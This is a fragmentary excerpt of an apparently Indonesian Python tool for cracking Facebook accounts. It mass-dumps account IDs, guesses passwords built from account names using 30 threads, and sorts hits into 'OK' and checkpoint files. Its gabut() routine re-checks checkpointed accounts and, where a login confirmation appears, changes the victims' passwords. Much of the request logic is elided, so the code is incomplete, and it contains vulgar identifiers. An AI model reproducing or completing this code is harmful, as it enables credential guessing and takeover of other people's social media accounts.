...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mnaldikont_sinaga_xy')
...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL TUNNGU SEBNTAR{x} ');time.sleep(1)
...
def menu(my_name,my_id):
	...
	print(x+'['+h+'•'+x+'] \033[0;34mNama  : '+str(my_name))
	print(x+'['+h+'•'+x+'] \033[0;34mID    : '+str(my_id))
	print(x+'['+h+'•'+x+'] \033[0;34mIP    : '+str(ip))
	#naldikont_xy(f'>#> Your Idz : '+str(my_id)
	#naldikont_xy(f'>#> Your Ip  : {ip}')
	print('')
	print(x+'\n['+h+'1'+x+'] Crack \x1b[1;92m(ON)') 
	print(x+'['+h+'2'+x+'] Check \x1b[1;92m(ON)') 
	#print(x+'['+h+'3'+x+'] Check Opsi \x1b[1;92m(ON)') 
	print(x+'['+h+'0'+x+'] Logout ')
	_____naldikont__sinaga_____ = input(x+'\n['+h+'•'+x+'] Select : ')
	if _____naldikont__sinaga_____ in ['1']:
		dump_massal()
	elif _____naldikont__sinaga_____ in ['2']:
		hasil_crack()
	elif _____naldikont__sinaga_____ in ['3']:
		gabut()
	elif _____naldikont__sinaga_____ in ['3']:
		gabut()
	#elif _____naldikont__sinaga_____ #in #['2']:
	...
	#elif _____naldikont__sinaga_____ #in #['3']:
		#gabut()
	elif _____naldikont__sinaga_____ in ['0']:
...
def dump_massal():
	...
	try:
		...
		print(' Kau disuruh masukkan angka, bukan huruf anjing :) ')
		exit()
	if jum<1 or jum>100:
...
def hasil_crack():
	no,nom = 0,[]
	print("")
	one = input("╰-> 1.Lihat Hasil Crack OK\n╰-> 2.Lihat Hasil Crack CP\n╰-> 3.Kembali")
	inhasil = input(f"╰--> Pilih : ")
	if inhasil in ["1","01"]:
...
def setting():
	...
	if hc in ['1','01']:
		...
		print('→GW DAH BILANG Mbasic OFF Sayangg😒')
		setting()
	else:
		method.append('mobile')
	_jembot_ = input(x+'\n['+h+'?'+x+'] Tampilkan Aplikasi ? ')
	_jembot_ = input(x+'\n['+h+'!'+x+'] Masukkan Password Script→ ')
	if _jembot_ in ['ya']:
		print('>> pasowrd salah ')
		back()
	elif _jembot_ in ['naldidev','NALDIDEV']:
		taplikasi.append('NALDIDEV')
	else:
		taplikasi.append('no')
		os.system('clear')
#	if _jembot_ in ['']:
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for kepalamu in id2:
			idf,nmf = kepalamu.split('|')[0],kepalamu.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
...
def gabut():
    ...
    try:
        buka_bajumu = open(f'CP/{files}','r').readlines()
    except IOError:
    ...
    if ww in ("Y","y","ya"):
        ...
        if len(pwBar) <= 5:
            ...
            pwBaru.append(pwBar)
    print('%s [%s*%s] Total %s%s%s Akun'%(N,O,N,K,str(len(buka_bajumu)),N))
    jalan(" %s[%s#%s] --------------------------------------------"%(N,O,N))
    for memek in buka_bajumu:
        ...
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    ...
                    print(f"\r  🎉{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melayangutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
...
def ceker(idf,pw):
	...
	try:
		...
		for ayang in jo('input'):
			if ayang.get('name') in lion:
				data.update({ayang.get('name'):ayang.get('value')})
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/naldikont-DUMP')
	except:pass
